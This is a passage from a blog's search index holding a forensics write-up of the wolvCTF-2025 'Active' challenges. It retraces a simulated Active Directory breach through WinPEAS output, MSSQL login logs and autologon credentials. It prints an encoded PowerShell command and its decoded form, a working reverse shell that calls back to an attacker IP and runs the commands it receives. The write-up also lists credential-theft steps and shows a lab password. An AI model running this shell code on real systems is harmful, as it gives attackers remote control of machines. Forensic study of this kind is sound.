<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>wolvCTF-2025</title>
      <link href="/2025/03/21/wolvctf-2025/"/>
      <url>/2025/03/21/wolvctf-2025/</url>
      
        <content type="html"><![CDATA[<p>I participated in wolvCTF-2025, organized by w01verines as a core member of the team InfoSecIITR. Our team secured 11th place globally in the Open Bracket. Here are the Writeups of all the Forensics challenges I was personally able to solve during the competition.</p><p><img src="/./images/wolv_foren.png" alt="Image"></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Active-series-1-2-and-3"><a href="#Active-series-1-2-and-3" class="headerlink" title="Active series (1, 2 and 3)"></a>Active series (1, 2 and 3)</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Chal 1 -&gt; Oh no! Our beloved <code>wolvctf.corp</code> domain has been infiltrated! How did they manage to break into our domain controller? Please figure out how they got access into the domain controller box, how a shell was achieved, and how a domain account was obtained. </p><p>Chal 2 -&gt; The attacker moved laterally throughout our domain. I’m hearing reports from other members of wolvctf.corp that 3 lower level accounts were compromised (excluding the 2 higher level compromised accounts). Figure out which ones these are, and follow the attacker’s steps to collect the flag.</p><p>Chal 3 -&gt; Now, it’s time to figure out how this attacker obtained administrator access on our domain! To prove you have retraced the attacker’s steps completely, submit the domain admin’s password as the flag. It’s already in the flag format.</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>We were given the complete file system of the compromised system and we need to find the complete attack process and follow the evidences to uncover our flags.<br>Let me first describe the entire process of privelage escalation of the attack in brief.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">The</span> <span class="string">attacker</span> <span class="string">first</span> <span class="string">uses</span> <span class="string">`WinPEAS`</span> <span class="string">to</span> <span class="string">discover</span> <span class="string">the</span> <span class="string">running</span> <span class="string">services</span> <span class="string">on</span> <span class="string">the</span> <span class="string">system</span> <span class="string">where</span> <span class="string">he</span> <span class="string">founds</span> <span class="string">an</span> <span class="string">open</span> <span class="string">`MSSQL</span> <span class="string">server`</span> <span class="string">so</span> <span class="string">the</span> <span class="string">attacker</span> <span class="string">first</span> <span class="string">tries</span> <span class="string">brute</span> <span class="string">forcing</span> <span class="string">the</span> <span class="string">credentials</span> <span class="string">in</span> <span class="string">case</span> <span class="string">of</span> <span class="string">a</span> <span class="string">weak</span> <span class="string">password</span> <span class="string">but</span> <span class="string">when</span> <span class="string">it</span> <span class="string">fails</span> <span class="string">he</span> <span class="string">tries</span> <span class="string">to</span> <span class="string">leverage</span> <span class="string">the</span> <span class="string">`xp_cmdshell`</span> <span class="string">to</span> <span class="string">get</span> <span class="string">powershell</span> <span class="string">execution.</span> <span class="string">Along</span> <span class="string">with</span> <span class="string">this</span> <span class="string">the</span> <span class="string">WinPEAS</span> <span class="string">also</span> <span class="string">enumerated</span> <span class="string">the</span> <span class="string">`Autologon</span> <span class="string">creds`</span> <span class="string">to</span> <span class="string">and</span> <span class="string">succesfully</span> <span class="string">retrieves</span> <span class="string">password</span> <span class="string">for</span> <span class="string">dan</span> <span class="string">through</span> <span class="string">which</span> <span class="string">he</span> <span class="string">tries</span> <span class="string">to</span> <span class="string">exploit</span> <span class="string">`Kerberos`</span> <span class="string">using</span> <span class="string">`Rubeus`</span> <span class="string">and</span> <span class="string">gets</span> <span class="string">the</span> <span class="string">access</span> <span class="string">as</span> <span class="string">user</span> <span class="string">emily.</span> <span class="string">Next</span> <span class="string">the</span> <span class="string">file</span> <span class="string">directory</span> <span class="string">of</span> <span class="string">emily</span> <span class="string">gives</span> <span class="string">the</span> <span class="string">user</span> <span class="string">the</span> <span class="string">password</span> <span class="string">for</span> <span class="string">james</span> <span class="string">after</span> <span class="string">which</span> <span class="string">he</span> <span class="string">tries</span> <span class="string">to</span> <span class="string">change</span> <span class="string">the</span> <span class="string">password</span> <span class="string">for</span> <span class="string">both</span> <span class="string">emily</span> <span class="string">and</span> <span class="string">patrick</span> <span class="string">giving</span> <span class="string">him</span> <span class="string">the</span> <span class="string">access</span> <span class="string">as</span> <span class="string">patrick</span> <span class="string">as</span> <span class="string">well.</span> <span class="string">Again</span> <span class="string">the</span> <span class="string">file</span> <span class="string">directory</span> <span class="string">of</span> <span class="string">patrick</span> <span class="string">gives</span> <span class="string">him</span> <span class="string">jake&#x27;s</span> <span class="string">password</span> <span class="string">giving</span> <span class="string">access</span> <span class="string">as</span> <span class="string">jake.</span> <span class="string">Now</span> <span class="string">since</span> <span class="string">there</span> <span class="string">was</span> <span class="literal">no</span> <span class="string">possible</span> <span class="string">evidence</span> <span class="string">in</span> <span class="string">the</span> <span class="string">file</span> <span class="string">directory</span> <span class="string">the</span> <span class="string">attacker</span> <span class="string">tries</span> <span class="string">to</span> <span class="string">dump</span> <span class="string">the</span> <span class="string">`registry</span> <span class="string">hives`</span> <span class="string">and</span> <span class="string">get</span> <span class="string">the</span> <span class="string">hash</span> <span class="string">of</span> <span class="string">the</span> <span class="string">domain</span> <span class="string">admin</span> <span class="string">Jessica&#x27;s</span> <span class="string">password</span> <span class="string">which</span> <span class="string">he</span> <span class="string">is</span> <span class="string">able</span> <span class="string">to</span> <span class="string">brute</span> <span class="string">by</span> <span class="string">the</span> <span class="string">group</span> <span class="string">password</span> <span class="string">law</span> <span class="string">in</span> <span class="string">the</span> <span class="string">wolvctf.corp</span> <span class="string">giving</span> <span class="string">the</span> <span class="string">attacker</span> <span class="string">Jessica&#x27;a</span> <span class="string">password</span> <span class="string">and</span> <span class="string">ultimately</span> <span class="string">the</span> <span class="string">`Admin`</span> <span class="string">access.</span></span><br></pre></td></tr></table></figure><p>Now lets follow the evidences to retrace this whole process and uncover our three flgs on the way.</p><h5 id="Presence-of-MSSQL-server"><a href="#Presence-of-MSSQL-server" class="headerlink" title="Presence of MSSQL server"></a>Presence of MSSQL server</h5><p>We can find the <a href="https://github.com/peass-ng/PEASS-ng">WinPEAS</a> (Windows Privilege Escalation Awesome Script), a powerful, automated enumeration tool designed to identify privilege escalation vulnerabilities on Windows systems. output file at the location <code>./Users/Public/Documents/</code> where the MSSQL server can be identified running at is default port <code>1433</code> in the enumerated IPV4 connections’ section,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Enumerating IPv4 connections</span><br><span class="line">  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name</span><br><span class="line"></span><br><span class="line">  TCP        0.0.0.0               88            0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               135           0.0.0.0               0               Listening         892             svchost</span><br><span class="line">  TCP        0.0.0.0               389           0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System</span><br><span class="line">  TCP        0.0.0.0               464           0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               593           0.0.0.0               0               Listening         892             svchost</span><br><span class="line">  TCP        0.0.0.0               636           0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         3364            C:\Users\mssql_service\MSSQL13.SQLEXPRESS\MSSQL\Binn\sqlservr.exe</span><br><span class="line">  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         1436            svchost</span><br><span class="line">  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System</span><br><span class="line">  TCP        0.0.0.0               9389          0.0.0.0               0               Listening         2340            Microsoft.ActiveDirectory.WebServices</span><br><span class="line">  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System</span><br><span class="line">  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         500             wininit</span><br><span class="line">  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         356             svchost</span><br><span class="line">  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         60              svchost</span><br><span class="line">  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         1652            svchost</span><br><span class="line">  TCP        0.0.0.0               49678         0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               49679         0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               49681         0.0.0.0               0               Listening         644             lsass</span><br><span class="line">  TCP        0.0.0.0               49682         0.0.0.0               0               Listening         2304            spoolsv</span><br><span class="line">  TCP        0.0.0.0               49685         0.0.0.0               0               Listening         636             services</span><br><span class="line">  TCP        0.0.0.0               49688         0.0.0.0               0               Listening         3364            C:\Users\mssql_service\MSSQL13.SQLEXPRESS\MSSQL\Binn\sqlservr.exe</span><br><span class="line">  TCP        0.0.0.0               49693         0.0.0.0               0               Listening         2416            dns</span><br><span class="line">  TCP        0.0.0.0               60689         0.0.0.0               0               Listening         9052            dfsrs</span><br><span class="line">  TCP        127.0.0.1             53            0.0.0.0               0               Listening         2416            dns</span><br><span class="line">  TCP        192.168.187.138       53            0.0.0.0               0               Listening         2416            dns</span><br><span class="line">  TCP        192.168.187.138       139           0.0.0.0               0               Listening         4               System</span><br><span class="line">  TCP        192.168.187.138       58485         52.159.126.152        443             Established       60              svchost</span><br><span class="line">  TCP        192.168.187.138       60700         192.168.187.128       1433            Established       8532            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line">  TCP        192.168.231.128       53            0.0.0.0               0               Listening         2416            dns</span><br><span class="line">  TCP        192.168.231.128       139           0.0.0.0               0               Listening         4               System</span><br></pre></td></tr></table></figure><h5 id="MSSQL-server-credential-brute-forcing"><a href="#MSSQL-server-credential-brute-forcing" class="headerlink" title="MSSQL server credential brute forcing"></a>MSSQL server credential brute forcing</h5><p>We can find the MSSQL (Microsoft SQL Server 2016 SP2) <code>ERRORLOG</code> at the following location <code>./Users/mssql_service/MSSQL13.SQLEXPRESS/MSSQL/Log/</code> where we find the server setup logs (normal) followed by a a series of failed login attempts giving the bruteforce and also the first part of the flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">2025-03-18 12:29:13.42 Server      The SQL Server Network Interface library could not register the Service Principal Name (SPN) [ MSSQLSvc/DC01.wolvctf.corp:1433 ] <span class="keyword">for</span> the SQL Server service. Windows <span class="built_in">return</span> code: 0x2098, state: 15. Failure to register a SPN might cause integrated authentication to use NTLM instead of Kerberos. This is an informational message. Further action is only required <span class="keyword">if</span> Kerberos authentication is required by authentication policies and <span class="keyword">if</span> the SPN has not been manually registered.</span><br><span class="line">2025-03-18 12:29:14.01 Server      [ERROR] Failure <span class="keyword">while</span> enumerating counters: 0xc0000bdb (d:\b\s3\sources\sql\ntdbms\hekaton\engine\perfctrs\hkengperfctrs.cpp : 984 - <span class="string">&#x27;enumerateCountersAndAddToQuery&#x27;</span>)</span><br><span class="line">2025-03-18 12:29:14.04 Server      Software Usage Metrics is disabled.</span><br><span class="line">2025-03-18 13:28:27.74 spid52      Using <span class="string">&#x27;dbghelp.dll&#x27;</span> version <span class="string">&#x27;4.0.5&#x27;</span></span><br><span class="line">2025-03-18 19:51:14.50 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:14.50 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;root&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:15.13 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:15.13 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;test&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:15.74 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:15.74 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;admin&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:16.32 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:16.32 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;bruteforcing&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:17.00 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:17.00 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;this&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:17.85 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:17.85 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;is&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:18.43 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:18.43 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;the&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:19.05 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:19.05 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;first&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:19.69 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:19.69 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;part&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:20.31 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:20.31 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;w&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:20.86 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:20.86 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;c&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:21.68 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:21.68 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;t&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:22.30 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:22.30 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;f&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:23.12 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:23.12 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;&#123;&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:23.96 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:23.96 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;d&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:24.56 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:24.56 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;0&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:25.22 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:25.22 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;n&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:25.82 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:25.82 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;t&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:26.49 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:26.49 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;_&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:27.21 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:27.21 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;3&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:27.93 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:27.93 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;n&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:28.60 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:28.60 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;4&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:29.11 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:29.11 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;b&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:29.64 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:29.64 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;l&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:30.29 Logon       Error: 18456, Severity: 14, State: 5.</span><br><span class="line">2025-03-18 19:51:30.29 Logon       Login failed <span class="keyword">for</span> user <span class="string">&#x27;3&#x27;</span>. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]</span><br><span class="line">2025-03-18 19:51:55.62 spid54      Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">2025-03-18 19:51:55.63 spid54      Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">2025-03-18 19:51:58.29 spid54      Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 1 to 0. Run the RECONFIGURE statement to install.</span><br><span class="line">2025-03-18 19:51:58.33 spid54      Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 1 to 0. Run the RECONFIGURE statement to install.</span><br><span class="line">2025-03-18 21:14:25.14 spid5s      SQL Server is terminating <span class="keyword">in</span> response to a <span class="string">&#x27;stop&#x27;</span> request from Service Control Manager. This is an informational message only. No user action is required.</span><br><span class="line">2025-03-18 21:14:26.61 spid13s     Service Broker manager has shut down.</span><br><span class="line">2025-03-18 21:14:26.65 spid5s      .NET Framework runtime has been stopped.</span><br><span class="line">2025-03-18 21:14:27.51 spid5s      SQL Server shutdown has been initiated</span><br><span class="line">2025-03-18 21:14:27.53 spid5s      SQL Trace was stopped due to server shutdown. Trace ID = <span class="string">&#x27;1&#x27;</span>. This is an informational message only; no user action is required.</span><br></pre></td></tr></table></figure><p>Flag 1.1: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wctf&#123;d0nt_3n4bl3_</span></span><br></pre></td></tr></table></figure><h5 id="Getting-powershell-access"><a href="#Getting-powershell-access" class="headerlink" title="Getting powershell access"></a>Getting powershell access</h5><p>Again in the WinPEAS output we can find the following process execution signalling xp_cmdshell execution on MSSQL server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell(8532)</span><br><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: MSSQL<span class="variable">$SQLEXPRESS</span></span><br><span class="line">    Command Line: powershell  -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAOAA3AC4AMQAyADgAIgAsADEANAAzADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAIAA9ACAAIgBYADMAaABRAFgAMgBOAHQAWgBIAE4AbwBNAHoARQB4AFgAMwBjAHgAZABHAGgAZgBaAEQATgBtAFkAWABWAHMAZABGADkAagBjAGoATgBrAGMAMQA4AHcAYwBsADgAPQBzACIAOwAkAGYAbABhAGcAcAB0ADIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAKQApADsAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAGYAbABhAGcAcAB0ADIAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span><br></pre></td></tr></table></figure><p>Decoding this Base64 encoded cmd gives us</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;192.168.187.128&quot;</span>,1433);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$encoded_flagpt2</span> = <span class="string">&quot;X3hQX2NtZHNoMzExX3cxdGhfZDNmYXVsdF9jcjNkc18wcl8=s&quot;</span>;<span class="variable">$flagpt2</span> = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<span class="variable">$encoded_flagpt2</span>));Write-Output <span class="variable">$flagpt2</span>;<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>This creates a TCP connection and gives a reverse shell to the attacker with full powershell access and it also gives us the second part of our first flag.</p><p>Flag 1.2: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">_xP_cmdsh311_w1th_d3fault_cr3ds_0r_</span></span><br></pre></td></tr></table></figure><h5 id="Getting-Autologon-Credentials"><a href="#Getting-Autologon-Credentials" class="headerlink" title="Getting Autologon Credentials"></a>Getting Autologon Credentials</h5><p>Next again we find in the WinPEAS output that it enumerated and successfully gave the credentials of the user <code>dan</code> thus giving the attacker an entry point to the domain.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Looking <span class="keyword">for</span> AutoLogon credentials</span><br><span class="line">Some AutoLogon credentials were found</span><br><span class="line">    DefaultDomainName             :  WOLVCTF</span><br><span class="line">    DefaultUserName               :  WOLVCTF\Dan</span><br><span class="line">    DefaultPassword               :  DansSuperCoolPassw0rd!!</span><br><span class="line">    AltDefaultUserName            :  loot-in-hex:656e61626c335f347574306c6f67306e5f306b3f3f213f7d</span><br></pre></td></tr></table></figure><p>And the loot-in-hex field gives us our third part of first flag.</p><p>Flag 1.3: </p><figure class="highlight yaml"><table><tr><td 